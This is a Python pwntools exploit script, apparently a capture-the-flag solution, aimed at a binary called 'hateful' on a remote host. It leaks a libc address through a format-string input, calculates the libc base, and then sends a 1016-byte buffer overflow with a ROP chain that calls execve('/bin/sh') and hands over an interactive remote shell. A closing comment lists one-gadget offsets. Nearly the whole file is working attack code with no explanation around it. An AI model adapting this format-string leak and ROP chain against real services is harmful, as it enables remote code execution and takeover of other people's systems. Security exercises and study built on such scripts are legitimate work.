#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF(args.EXE or './hateful')
libc = ELF(exe.libc.path)

host = args.HOST or '52.59.124.14'
port = int(args.PORT or 5020)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, aslr=False, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
b *0x00401256
b *0x004012a0
continue
'''.format(**locals())

context.terminal = "tmux splitw -h".split()

io = start()

io.sendlineafter(b">> ", b"yay")
io.sendlineafter(b">> ", b"%p-"*10)
io.recvuntil(b"provided: ")
leak = io.recvline()[:-1]
libc_leak = leak.split(b'-')[4]

libc.address = int(libc_leak, 16) - 0x1d2a80

print(f"[+] leak {leak}")
print(f"[+] libc_leak {libc_leak}")
print(f"[+] libc.address {hex(libc.address)}")

offset = 1016

pop_rdi = libc.address + 0x00000000000277e5 #: pop rdi ; ret
pop_rdx = libc.address + 0x00000000000fde7d # : pop rdx ; ret
syscall = libc.address + 0x0000000000026428 # : syscall
pop_rax = libc.address + 0x000000000003f197 # : pop rax ; ret
pop_rsi = libc.address + 0x0000000000028f99 # : pop rsi ; ret
binsh = next(libc.search(b"/bin/sh"))


payload  = b"A" * offset

payload += p64( pop_rdi )
payload += p64(binsh)

payload += p64(pop_rdx)
payload += p64(0)

payload += p64(pop_rsi)
payload += p64(0)

payload += p64( pop_rax )
payload += p64(0x3b)

payload += p64(syscall)

io.sendlineafter(b"!\n", payload)

io.interactive()

"""
0x4c139 posix_spawn(rsp+0xc, "/bin/sh", 0, rbx, rsp+0x50, environ)

0x4c140 posix_spawn(rsp+0xc, "/bin/sh", 0, rbx, rsp+0x50, environ)

0xd511f execve("/bin/sh", rbp-0x40, r13)
"""